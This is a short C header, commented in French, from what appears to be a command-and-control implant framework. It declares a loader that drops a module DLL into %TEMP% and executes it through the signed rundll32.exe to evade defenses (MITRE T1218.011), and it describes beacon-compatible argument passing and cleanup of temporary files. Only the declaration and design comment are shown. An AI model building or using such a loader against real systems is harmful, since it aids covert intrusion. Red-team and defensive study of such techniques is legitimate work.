/*
 * ============================================================
 *  rundll32_loader.h - Execution via rundll32.exe (T1218.011)
 *
 *  Charge un module DLL en utilisant le binaire systeme legitime
 *  rundll32.exe comme proxy d'execution :
 *
 *  1. Ecrit la DLL dans %TEMP%\c2d_<pid><tick>.dll
 *  2. Passe les args via env var  C2_ARGS_HEX (hex little-endian)
 *  3. Definit la sortie via env var C2_OUTPUT_FILE (<temp>.bin)
 *  4. Lance : rundll32.exe <temp.dll>,c2_rundll32_entry
 *  5. Attend la fin du processus (timeout 30s)
 *  6. Lit C2_OUTPUT_FILE > module_result_t
 *  7. Nettoie les deux fichiers temporaires
 *
 *  Le point d'entree c2_rundll32_entry() est defini dans
 *  beacon_compatibility.c (compile dans chaque DLL module).
 *
 *  MITRE ATT&CK : T1218.011 - Signed Binary Proxy Execution: Rundll32
 *
 * ============================================================
 */
#ifndef RUNDLL32_LOADER_H
#define RUNDLL32_LOADER_H

#include "execution_engine.h"

/*
 * Charge et execute une DLL module via rundll32.exe.
 *
 * @param dll_bytes : bytes bruts de la DLL (.dll PE64)
 * @param dll_size  : taille en bytes
 * @param args      : arguments packes pour go() (format BeaconDataParse)
 * @param args_len  : taille des arguments (0 si aucun)
 * @return module_result_t - appeler free_module_result() apres usage
 */
module_result_t rundll32_loader_execute(
    const unsigned char *dll_bytes, size_t dll_size,
    const unsigned char *args,      size_t args_len
);

#endif /* RUNDLL32_LOADER_H */
